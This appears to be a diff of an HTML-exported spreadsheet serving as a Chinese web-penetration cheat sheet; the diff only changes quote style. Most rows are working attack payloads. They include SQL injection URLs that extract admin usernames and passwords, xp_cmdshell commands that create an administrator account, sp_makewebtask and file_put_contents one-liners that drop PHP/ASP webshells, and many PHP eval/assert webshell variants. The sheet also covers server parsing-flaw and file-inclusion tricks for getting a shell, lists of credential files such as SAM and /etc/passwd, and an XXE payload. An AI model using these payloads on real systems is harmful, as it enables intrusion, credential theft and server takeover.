-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class'))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r79">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class'))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r80'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class','D99_CMD'))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r80">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 name from sysobjects where xtype='u' and status&gt;0 and name not in('bigclass','admin','class','D99_CMD'))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r81'>
-<td class='x73'>暴列：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r81">
+<td class="x73">暴列：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r82'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),1) from sysobjects)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r82">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),1) from sysobjects)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r83'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),2) from sysobjects)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r83">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),2) from sysobjects)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r84'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),3) from sysobjects)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r84">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (Select Top 1 col_name(object_id('admin'),3) from sysobjects)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r85'>
-<td class='x73'>暴内容：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r85">
+<td class="x73">暴内容：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r86'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r86">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r87'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin)&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r87">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin)&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r88'>
-<td class='x73'>暴第2条内容：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r88">
+<td class="x73">暴第2条内容：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r89'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 1 username from admin))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r89">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 1 username from admin))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r90'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 1 pass from admin))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r90">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 1 pass from admin))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r91'>
-<td class='x73'>暴第3条内容：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r91">
+<td class="x73">暴第3条内容：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r92'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 2 username from admin))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r92">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 username from admin where username not in (select top 2 username from admin))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r93'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 2 pass from admin))&gt;0;--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r93">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and (select top 1 pass from admin where pass not in (select top 2 pass from admin))&gt;0;--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r94'>
-<td class='x73'>xp_cmdshell扩展存储过程执行命令：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r94">
+<td class="x73">xp_cmdshell扩展存储过程执行命令：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r95'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell');--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r95">
+<td class="x73">http://localhost:83/looknews.asp?id=20 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell');--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r96'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net user cmdshell cmdshell /add';--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r96">
+<td class="x73">http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net user cmdshell cmdshell /add';--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r97'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net localgroup administrators cmdshell /add';--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r97">
+<td class="x73">http://localhost:83/looknews.asp?id=20;exec master.dbo.xp_cmdshell 'net localgroup administrators cmdshell /add';--</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r98'>
-<td class='x73'>sp_makewebtask扩展存储过程导出一句话：</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r98">
+<td class="x73">sp_makewebtask扩展存储过程导出一句话：</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r99'>
-<td class='x73'>http://localhost:83/looknews.asp?id=20;exec sp_makewebtask 'c:\Inetpub\wwwroot\www.secdic.com.asp','select''&lt;%25eval request("pass")%25&gt;''';--</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r99">
+<td class="x73">http://localhost:83/looknews.asp?id=20;exec sp_makewebtask 'c:\Inetpub\wwwroot\www.secdic.com.asp','select''&lt;%25eval request("pass")%25&gt;''';--</td>
  </tr>
- <tr height='20' class='x69' style='mso-height-source:userset;height:15.6pt' id='r100'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x76'></td>
+ <tr height="20" class="x69" style="mso-height-source:userset;height:15.6pt" id="r100">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x76"></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r101'>
-<td rowspan='10' height='1240' class='x72' style='height:930.6pt;'>PHP代码执行函数总结</td>
-<td class='x73'>&lt;?php @eval($_REQUEST[cmd]);?&gt;</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r101">
+<td rowspan="10" height="1240" class="x72" style="height:930.6pt;">PHP代码执行函数总结</td>
+<td class="x73">&lt;?php @eval($_REQUEST[cmd]);?&gt;</td>
  </tr>
- <tr height='80' style='mso-height-source:userset;height:60pt' id='r102'>
-<td class='x77'>&lt;?php <br>//?cmd=phpinfo()<br>assert($_REQUEST[cmd]); <br>?&gt;</td>
+ <tr height="80" style="mso-height-source:userset;height:60pt" id="r102">
+<td class="x77">&lt;?php <br>//?cmd=phpinfo()<br>assert($_REQUEST[cmd]); <br>?&gt;</td>
  </tr>
- <tr height='80' style='mso-height-source:userset;height:60pt' id='r103'>
-<td class='x77'>&lt;?php <br>//?cmd=phpinfo()<br>@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");<br>?&gt;</td>
+ <tr height="80" style="mso-height-source:userset;height:60pt" id="r103">
+<td class="x77">&lt;?php <br>//?cmd=phpinfo()<br>@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");<br>?&gt;</td>
  </tr>
- <tr height='100' style='mso-height-source:userset;height:75pt' id='r104'>
-<td class='x78'>&lt;?php <br>//?cmd=phpinfo();<br>$func =create_function('',$_REQUEST['cmd']);<br>$func();<br>?&gt;</td>
+ <tr height="100" style="mso-height-source:userset;height:75pt" id="r104">
+<td class="x78">&lt;?php <br>//?cmd=phpinfo();<br>$func =create_function('',$_REQUEST['cmd']);<br>$func();<br>?&gt;</td>
  </tr>
- <tr height='160' style='mso-height-source:userset;height:120pt' id='r105'>
-<td class='x78'>&lt;?php<br>//?func=system&amp;cmd=whoami<br>$func=$_GET['func'];<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>$new_array=array_map($func,$array);<br>//print_r($new_array);<br>?&gt;</td>
+ <tr height="160" style="mso-height-source:userset;height:120pt" id="r105">
+<td class="x78">&lt;?php<br>//?func=system&amp;cmd=whoami<br>$func=$_GET['func'];<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>$new_array=array_map($func,$array);<br>//print_r($new_array);<br>?&gt;</td>
  </tr>
- <tr height='220' style='mso-height-source:userset;height:165pt' id='r106'>
-<td class='x78'>&lt;?php <br>//?cmd=phpinfo()<br>@call_user_func(assert,$_GET['cmd']);<br>?&gt;<br><br>&lt;?php <br>//?cmd=phpinfo()<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>call_user_func_array("assert",$array);<br>?&gt;</td>
+ <tr height="220" style="mso-height-source:userset;height:165pt" id="r106">
+<td class="x78">&lt;?php <br>//?cmd=phpinfo()<br>@call_user_func(assert,$_GET['cmd']);<br>?&gt;<br><br>&lt;?php <br>//?cmd=phpinfo()<br>$cmd=$_GET['cmd'];<br>$array[0]=$cmd;<br>call_user_func_array("assert",$array);<br>?&gt;</td>
  </tr>
- <tr height='140' style='mso-height-source:userset;height:105pt' id='r107'>
-<td class='x78'>&lt;?php <br>//?func=system&amp;cmd=whoami<br>$cmd=$_GET['cmd'];<br>$array1=array($cmd);<br>$func =$_GET['func'];<br>array_filter($array1,$func);<br>?&gt;</td>
+ <tr height="140" style="mso-height-source:userset;height:105pt" id="r107">
+<td class="x78">&lt;?php <br>//?func=system&amp;cmd=whoami<br>$cmd=$_GET['cmd'];<br>$array1=array($cmd);<br>$func =$_GET['func'];<br>array_filter($array1,$func);<br>?&gt;</td>
  </tr>
- <tr height='220' style='mso-height-source:userset;height:165pt' id='r108'>
-<td class='x78'>php环境&gt;=5.6才能用<br>&lt;?php usort(...$_GET);?&gt;<br>利用方式：<br>test.php?1[]=1-1&amp;1[]=eval($_POST['x'])&amp;2=assert<br>[POST]:x=phpinfo();<br><br>php环境&gt;=5.6才能用<br>&lt;?php usort($_GET,'asse'.'rt');?&gt;<br>利用方式：<br>test.php?1=1+1&amp;2=eval($_POST[x])<br>[POST]:x=phpinfo();</td>
+ <tr height="220" style="mso-height-source:userset;height:165pt" id="r108">
+<td class="x78">php环境&gt;=5.6才能用<br>&lt;?php usort(...$_GET);?&gt;<br>利用方式：<br>test.php?1[]=1-1&amp;1[]=eval($_POST['x'])&amp;2=assert<br>[POST]:x=phpinfo();<br><br>php环境&gt;=5.6才能用<br>&lt;?php usort($_GET,'asse'.'rt');?&gt;<br>利用方式：<br>test.php?1=1+1&amp;2=eval($_POST[x])<br>[POST]:x=phpinfo();</td>
  </tr>
- <tr height='140' style='mso-height-source:userset;height:105pt' id='r109'>
-<td class='x78'>&lt;?php <br>$test='&lt;?php eval($_POST[cmd]);?&gt;';<br>file_put_contents('test1.php',$test);<br>?&gt;<br>&lt;?php <br>fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;'); <br>?&gt;</td>
+ <tr height="140" style="mso-height-source:userset;height:105pt" id="r109">
+<td class="x78">&lt;?php <br>$test='&lt;?php eval($_POST[cmd]);?&gt;';<br>file_put_contents('test1.php',$test);<br>?&gt;<br>&lt;?php <br>fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;'); <br>?&gt;</td>
  </tr>
- <tr height='80' style='mso-height-source:userset;height:60pt' id='r110'>
-<td class='x78'>&lt;?php <br>//?a=assert&amp;b=phpinfo()<br>$_GET['a']($_GET['b']);<br>?&gt;</td>
+ <tr height="80" style="mso-height-source:userset;height:60pt" id="r110">
+<td class="x78">&lt;?php <br>//?a=assert&amp;b=phpinfo()<br>$_GET['a']($_GET['b']);<br>?&gt;</td>
  </tr>
- <tr height='20' class='x70' style='mso-height-source:userset;height:15.6pt' id='r111'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x75'></td>
+ <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r111">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x75"></td>
  </tr>
- <tr height='40' style='mso-height-source:userset;height:30pt' id='r112'>
-<td rowspan='3' height='160' class='x72' style='height:120pt;'>IIS5.x-6.x解析漏洞</td>
-<td class='x78'>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件</td>
+ <tr height="40" style="mso-height-source:userset;height:30pt" id="r112">
+<td rowspan="3" height="160" class="x72" style="height:120pt;">IIS5.x-6.x解析漏洞</td>
+<td class="x78">形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件</td>
  </tr>
- <tr height='40' style='mso-height-source:userset;height:30pt' id='r113'>
-<td class='x78'>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</td>
+ <tr height="40" style="mso-height-source:userset;height:30pt" id="r113">
+<td class="x78">形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</td>
  </tr>
- <tr height='80' style='mso-height-source:userset;height:60pt' id='r114'>
-<td class='x78'>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</td>
+ <tr height="80" style="mso-height-source:userset;height:60pt" id="r114">
+<td class="x78">IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</td>
  </tr>
- <tr height='60' style='mso-height-source:userset;height:45pt' id='r115'>
-<td rowspan='2' height='100' class='x72' style='height:75pt;'>apache解析漏洞</td>
-<td class='x78'>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php<br>漏洞形式：www.xxxx.xxx.com/test.php.php123</td>
+ <tr height="60" style="mso-height-source:userset;height:45pt" id="r115">
+<td rowspan="2" height="100" class="x72" style="height:75pt;">apache解析漏洞</td>
+<td class="x78">Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php<br>漏洞形式：www.xxxx.xxx.com/test.php.php123</td>
  </tr>
- <tr height='40' style='mso-height-source:userset;height:30pt' id='r116'>
-<td class='x78'>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</td>
+ <tr height="40" style="mso-height-source:userset;height:30pt" id="r116">
+<td class="x78">（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</td>
  </tr>
- <tr height='160' style='mso-height-source:userset;height:120pt' id='r117'>
-<td rowspan='2' height='220' class='x72' style='height:165pt;'>nginx解析漏洞</td>
-<td class='x78'>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了<br>漏洞形式：<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</td>
+ <tr height="160" style="mso-height-source:userset;height:120pt" id="r117">
+<td rowspan="2" height="220" class="x72" style="height:165pt;">nginx解析漏洞</td>
+<td class="x78">Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了<br>漏洞形式：<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</td>
  </tr>
- <tr height='60' style='mso-height-source:userset;height:45pt' id='r118'>
-<td class='x78'>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;<br>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</td>
+ <tr height="60" style="mso-height-source:userset;height:45pt" id="r118">
+<td class="x78">另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;<br>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</td>
  </tr>
- <tr height='20' class='x70' style='mso-height-source:userset;height:15.6pt' id='r119'>
-<td height='20' class='x75' style='height:15.6pt;'></td>
-<td class='x75'></td>
+ <tr height="20" class="x70" style="mso-height-source:userset;height:15.6pt" id="r119">
+<td height="20" class="x75" style="height:15.6pt;"></td>
+<td class="x75"></td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r120'>
-<td rowspan='5' height='104' class='x72' style='height:78pt;'>windows</td>
-<td class='x71'>c:\boot.ini</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r120">
+<td rowspan="5" height="104" class="x72" style="height:78pt;">windows</td>
+<td class="x71">c:\boot.ini</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r121'>
-<td class='x71'>c:\windows\systems32\inetsrv\MetaBase.xml</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r121">
+<td class="x71">c:\windows\systems32\inetsrv\MetaBase.xml</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r122'>
-<td class='x71'>c:\windows\repair\sam</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r122">
+<td class="x71">c:\windows\repair\sam</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r123'>
-<td class='x71'>c:\windows\php.ini php配置文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r123">
+<td class="x71">c:\windows\php.ini php配置文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r124'>
-<td class='x71'>c:\windows\my.ini mysql配置文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r124">
+<td class="x71">c:\windows\my.ini mysql配置文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r125'>
-<td rowspan='5' height='104' class='x72' style='height:78pt;'>Linux</td>
-<td class='x71'>/etc/passwd</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r125">
+<td rowspan="5" height="104" class="x72" style="height:78pt;">Linux</td>
+<td class="x71">/etc/passwd</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r126'>
-<td class='x71'>/usr/local/app/apache2/conf/http.conf</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r126">
+<td class="x71">/usr/local/app/apache2/conf/http.conf</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r127'>
-<td class='x71'>/usr/local/app/php5/lib/php.ini PHP相关设置</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r127">
+<td class="x71">/usr/local/app/php5/lib/php.ini PHP相关设置</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r128'>
-<td class='x71'>/etc/httpd/conf/http.conf apache配置文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r128">
+<td class="x71">/etc/httpd/conf/http.conf apache配置文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r129'>
-<td class='x71'>/etc/my.cnf mysql配置文件</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r129">
+<td class="x71">/etc/my.cnf mysql配置文件</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r130'>
-<td height='20' class='x71' style='height:15.6pt;'>文件包含写webshell</td>
-<td class='x71'>&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r130">
+<td height="20" class="x71" style="height:15.6pt;">文件包含写webshell</td>
+<td class="x71">&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
  </tr>
- <tr height='40' style='mso-height-source:userset;height:30pt' id='r131'>
-<td height='40' class='x71' style='height:30pt;'>本地包含配合文件上传</td>
-<td class='x78'>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
+ <tr height="40" style="mso-height-source:userset;height:30pt" id="r131">
+<td height="40" class="x71" style="height:30pt;">本地包含配合文件上传</td>
+<td class="x78">如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[cmd]);?&gt;")?&gt;</td>
  </tr>
- <tr height='61' style='mso-height-source:userset;height:46pt' id='r132'>
-<td height='61' class='x71' style='height:46pt;'>本地包含配合apache日志拿shell</td>
-<td class='x78'>apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，<br>便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/&lt;?php eval([$_POST]);?&gt;则会将一句话写入到access.log中，<br>但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。</td>
+ <tr height="61" style="mso-height-source:userset;height:46pt" id="r132">
+<td height="61" class="x71" style="height:46pt;">本地包含配合apache日志拿shell</td>
+<td class="x78">apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，<br>便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/&lt;?php eval([$_POST]);?&gt;则会将一句话写入到access.log中，<br>但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。</td>
  </tr>
- <tr height='40' style='mso-height-source:userset;height:30pt' id='r133'>
-<td height='40' class='x71' style='height:30pt;'>利用/proc/self/environ进行包含</td>
-<td class='x78'>如：http://www.test.com/view.php?page=../../../../proc/self/environ<br>这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。</td>
+ <tr height="40" style="mso-height-source:userset;height:30pt" id="r133">
+<td height="40" class="x71" style="height:30pt;">利用/proc/self/environ进行包含</td>
+<td class="x78">如：http://www.test.com/view.php?page=../../../../proc/self/environ<br>这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r134'>
-<td height='20' class='x71' style='height:15.6pt;'>php://filter</td>
-<td class='x71'>php://filter/read=convert.base64-encode/resource=index.php</td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r134">
+<td height="20" class="x71" style="height:15.6pt;">php://filter</td>
+<td class="x71">php://filter/read=convert.base64-encode/resource=index.php</td>
  </tr>
- <tr height='60' style='mso-height-source:userset;height:45pt' id='r135'>
-<td height='60' class='x71' style='height:45pt;'>php://input</td>
-<td class='x78'>利用条件：<br>allow_url_include = On。<br>对allow_url_fopen不做要求。</td>
+ <tr height="60" style="mso-height-source:userset;height:45pt" id="r135">
+<td height="60" class="x71" style="height:45pt;">php://input</td>
+<td class="x78">利用条件：<br>allow_url_include = On。<br>对allow_url_fopen不做要求。</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r136'>
-<td height='20' class='x71' style='height:15.6pt;'>包含session</td>
-<td class='x79'><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_parent"><span style='font-size:12pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"等线";'>https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</span></a></td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r136">
+<td height="20" class="x71" style="height:15.6pt;">包含session</td>
+<td class="x79"><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_parent"><span style="font-size:12pt;color:#000000;font-weight:400;text-decoration:none;text-line-through:none;font-family:"等线";">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</span></a></td>
  </tr>
- <tr height='120' class='x70' style='mso-height-source:userset;height:90pt' id='r137'>
-<td height='120' class='x75' style='height:90pt;overflow:hidden;'>XEE:XML的外部实体“xxe”被赋予的值为：file:///etc/passwd。当解析xml文档是，xxe会被替换为file:///ect/passwd的内容。//https://www.cnblogs.com/ESHLkangi/p/9245404.html</td>
-<td class='x80'>&lt;?xml cersion="1.0"&gt;<br>&lt;!DOCTYPE hack [<br>&lt;!ENTITY xxe SYSTEM "file:///etc/password"&gt;<br>]&gt;<br><br>&lt;hack&gt;&amp;xxe;&lt;/hack&gt;</td>
+ <tr height="120" class="x70" style="mso-height-source:userset;height:90pt" id="r137">
+<td height="120" class="x75" style="height:90pt;overflow:hidden;">XEE:XML的外部实体“xxe”被赋予的值为：file:///etc/passwd。当解析xml文档是，xxe会被替换为file:///ect/passwd的内容。//https://www.cnblogs.com/ESHLkangi/p/9245404.html</td>
+<td class="x80">&lt;?xml cersion="1.0"&gt;<br>&lt;!DOCTYPE hack [<br>&lt;!ENTITY xxe SYSTEM "file:///etc/password"&gt;<br>]&gt;<br><br>&lt;hack&gt;&amp;xxe;&lt;/hack&gt;</td>
  </tr>
- <tr height='20' style='mso-height-source:userset;height:15.6pt' id='r138'>
-<td height='20' class='x81' style='height:15.6pt;'><a href="http://ceye.io" target="_parent"><span style='font-size:12pt;color:#800080;font-weight:400;text-decoration: underline;text-line-through:none;text-underline-style:single;font-family:"等线";'>http://ceye.io</span></a></td>
